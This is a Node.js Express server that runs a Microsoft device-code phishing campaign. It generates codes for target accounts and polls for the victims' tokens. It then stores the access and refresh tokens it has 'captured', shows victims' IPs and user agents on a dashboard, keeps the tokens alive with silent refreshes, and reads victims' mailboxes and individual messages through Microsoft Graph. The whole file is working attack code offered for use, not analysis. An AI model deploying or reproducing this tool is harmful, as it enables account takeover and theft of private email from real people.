const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let userSessions = new Map();  // sessionId -> session data
let pendingAuth = new Map();    // deviceCode -> pending data

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START ENDPOINT - Returns device code
// ============================================
app.post('/start', async (req, res) => {
    try {
        const acct = req.query.acct || req.body.acct || 'user@placeholder.com';
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        console.log(`[START] New auth request for ${acct} from IP: ${clientIp}`);
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval, verification_uri } = response.data;
        
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sessionId,
            acct,
            ip: clientIp,
            userAgent,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling for token
        pollForToken(device_code, sessionId);
        
        console.log(`[START] Generated code: ${user_code} for session: ${sessionId}`);
        
        res.json({
            userCode: user_code,
            deviceCode: device_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in,
            verificationUri: verification_uri
        });
        
    } catch (err) {
        console.error('[START] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// Poll for token in background
// ============================================
async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLL] Session ${sessionId} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            
            const sessionData = {
                sessionId: sessionId,
                email: userEmail,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString()
            };
            
            userSessions.set(sessionId, sessionData);
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ SUCCESS! Captured session for ${userEmail}`);
            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
            console.log(`   PRT: ${tokens.refresh_token ? 'YES' : 'NO'}`);
            
        } catch (err) {
            // Normal - waiting for user
            if (err.response?.data?.error !== 'authorization_pending') {
                // console.log('[POLL] Waiting for user...');
            }
        }
    }, 3000);
}

// ============================================
// STATE ENDPOINT - Check authentication status
// ============================================
app.get('/state', async (req, res) => {
    const deviceCode = req.query.device_code;
    const sessionId = req.query.session_id;
    
    if (!deviceCode) {
        return res.status(400).json({ error: 'Missing device_code' });
    }
    
    const pending = pendingAuth.get(deviceCode);
    const session = userSessions.get(sessionId);
    
    if (session) {
        // Session already captured
        return res.json({ 
            status: 'success',
            email: session.email,
            sessionId: session.sessionId
        });
    }
    
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success' });
        } else if (pending.status === 'pending') {
            return res.json({ status: 'pending' });
        } else if (pending.status === 'expired') {
            return res.json({ status: 'error', error: 'Code expired' });
        }
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// GET ALL SESSIONS FOR DASHBOARD
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        name: s.name,
        ip: s.ip,
        userAgent: s.userAgent,
        capturedAt: s.capturedAt,
        hasPRT: !!s.refresh_token
    }));
    res.json({ sessions: sessionList });
});

// ============================================
// GET TOKENS FOR A SESSION
// ============================================
app.get('/api/session/tokens/:sessionId', async (req, res) => {
    const session = userSessions.get(req.params.sessionId);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    // Refresh token if needed
    let accessToken = session.access_token;
    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'refresh_token',
                    refresh_token: session.refresh_token,
                    client_id: YOUR_CLIENT_ID
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            accessToken = response.data.access_token;
            session.access_token = accessToken;
            session.expires_in = response.data.expires_in;
            session.expires_at = Date.now() + (response.data.expires_in * 1000);
        } catch (err) {}
    }
    
    res.json({
        email: session.email,
        access_token: accessToken,
        refresh_token: session.refresh_token,
        expires_in: session.expires_in
    });
});

// ============================================
// MAILBOX API - Fetch real emails using access token
// ============================================
app.get('/api/mail/:sessionId/:folder', async (req, res) => {
    const { sessionId, folder } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    // Get fresh token
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'refresh_token',
                    refresh_token: session.refresh_token,
                    client_id: YOUR_CLIENT_ID
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            token = response.data.access_token;
            session.access_token = token;
        } catch (err) {}
    }
    
    try {
        const folderMap = {
            'inbox': 'inbox',
            'sent': 'sentitems',
            'drafts': 'drafts',
            'deleted': 'deleteditems'
        };
        const folderPath = folderMap[folder] || 'inbox';
        
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: {
                '$top': 50,
                '$orderby': 'receivedDateTime desc',
                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments'
            }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails', details: err.message });
    }
});

app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000 && session.refresh_token) {
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'refresh_token',
                    refresh_token: session.refresh_token,
                    client_id: YOUR_CLIENT_ID
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            token = response.data.access_token;
            session.access_token = token;
        } catch (err) {}
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    pendingAuth.clear();
    res.json({ success: true });
});

// ============================================
// SERVE FILES
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`========================================\n`);
});
